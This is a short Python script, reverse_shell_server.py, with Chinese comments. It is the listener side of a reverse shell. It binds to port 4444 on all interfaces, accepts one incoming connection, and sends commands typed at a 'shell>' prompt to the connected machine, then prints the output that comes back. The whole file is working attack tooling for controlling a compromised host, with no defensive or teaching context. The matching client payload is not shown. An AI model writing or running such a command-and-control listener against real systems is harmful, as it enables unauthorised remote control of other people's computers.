# reverse_shell_server.py
import socket

HOST = '0.0.0.0'  # 监听所有接口
PORT = 4444       # 监听端口

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f'[*] Listening on {HOST}:{PORT}')

    client_socket, client_address = server.accept()
    print(f'[*] Accepted connection from {client_address}')

    try:
        while True:
            command = input("shell> ")  # 输入命令
            if command.lower() == 'exit':
                client_socket.send(command.encode())
                break

            client_socket.send(command.encode())  # 发送命令
            output = client_socket.recv(4096).decode()  # 接收输出
            print(output)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Connection closed")

if __name__ == '__main__':
    start_server()